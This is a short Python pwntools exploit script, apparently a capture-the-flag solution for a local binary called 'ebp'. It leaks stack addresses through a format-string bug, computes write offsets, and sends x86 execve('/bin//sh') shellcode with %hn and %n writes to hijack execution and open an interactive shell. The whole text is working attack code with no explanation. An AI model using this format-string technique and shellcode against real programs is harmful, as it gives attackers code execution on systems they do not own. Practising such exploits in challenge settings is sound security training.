from pwn import *

proc = process('ebp')
proc.sendline('%10p'*4)
res = proc.recvuntil('\n').split('0x')[-1].strip('\n')
print res
res = (int(res, 16)&0xffff) - 0x20 + 4
print hex(res)
tmp1 = res - 43
tmp2 = 0x0804a480 - res - 60
print tmp1, tmp2
proc.sendline('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'%10x'*2+'%'+str(tmp1)+'c'+'%hn'+'%10x'*6+'%'+str(tmp2)+'c'+'%n')
proc.interactive()
